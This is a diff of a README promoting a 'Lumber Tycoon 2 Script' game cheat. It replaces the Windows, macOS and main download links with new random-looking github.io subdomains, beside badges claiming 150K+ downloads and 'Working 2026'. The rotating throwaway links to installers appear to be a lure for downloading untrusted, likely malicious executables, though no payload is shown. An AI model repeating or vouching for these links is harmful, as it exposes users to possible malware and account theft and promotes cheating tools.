@@ -4,7 +4,7 @@
 ![Downloads](https://img.shields.io/badge/Downloads-150K+-blueviolet?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Working%202026-blueviolet?style=for-the-badge)
 
-[![Download Lumber Tycoon 2 Script](https://img.shields.io/badge/Download%20Lumber%20Tycoon%202%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://vgscpzqjhvfd.github.io/win-download2/)
+[![Download Lumber Tycoon 2 Script](https://img.shields.io/badge/Download%20Lumber%20Tycoon%202%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://wccorxpwogeu.github.io/setup-win2/)
 
 ---
 
@@ -49,9 +49,9 @@ The most reliable **Lumber Tycoon 2 Script** for Lumber Tycoon 2 — auto-farm, 
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://vgscpzqjhvfd.github.io/win-download2/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://wccorxpwogeu.github.io/setup-win2/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://vgscpzqjhvfd.github.io/mac-pkg2/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://wccorxpwogeu.github.io/install-mac2/)
 
 </div>
 
